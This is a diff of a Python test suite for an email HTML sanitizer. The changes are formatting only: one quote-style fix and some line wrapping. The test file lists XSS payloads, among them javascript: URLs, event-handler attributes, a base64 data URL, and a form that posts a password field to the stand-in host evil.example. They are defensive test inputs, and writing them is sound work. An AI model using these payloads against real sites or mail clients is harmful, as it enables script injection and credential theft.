@@ -35,7 +35,7 @@ PAYLOADS = [
     "<svg onload=alert(1)><circle/></svg>",
     "<iframe src=javascript:alert(1)></iframe>",
     "<a href='javascript:alert(1)'>click</a>",
-    "<a href=\"data:text/html;base64,PHNjcmlwdD4=\">x</a>",
+    '<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>',
     "<p onclick='alert(1)' style='background:url(javascript:alert(1))'>hi</p>",
     "<form action=//evil.example><input name=pw></form>",
     "<object data=//evil.example/x.swf></object>",
@@ -52,7 +52,9 @@ PAYLOADS = [
 
 @pytest.mark.parametrize("payload", PAYLOADS)
 def test_no_active_markup_or_attribute_survives(payload: str) -> None:
-    text, cleaned = sanitize_email_bodies(body_text="", body_html=f"<p>antes</p>{payload}<p>después</p>")
+    text, cleaned = sanitize_email_bodies(
+        body_text="", body_html=f"<p>antes</p>{payload}<p>después</p>"
+    )
 
     lowered = cleaned.casefold()
     for fragment in FORBIDDEN_FRAGMENTS:
@@ -134,7 +136,9 @@ def test_self_closing_blocked_tags_do_not_leave_the_parser_blocked() -> None:
 
 
 def test_the_plain_text_body_wins_but_html_is_the_fallback_for_the_readable_text() -> None:
-    text, _ = sanitize_email_bodies(body_text="  texto   plano \r\n\r\n\r\n\r\nfin ", body_html="<p>html</p>")
+    text, _ = sanitize_email_bodies(
+        body_text="  texto   plano \r\n\r\n\r\n\r\nfin ", body_html="<p>html</p>"
+    )
     assert text == "texto plano\n\nfin"
 
     fallback, _ = sanitize_email_bodies(body_text="", body_html="<p>uno</p><p>dos</p>")
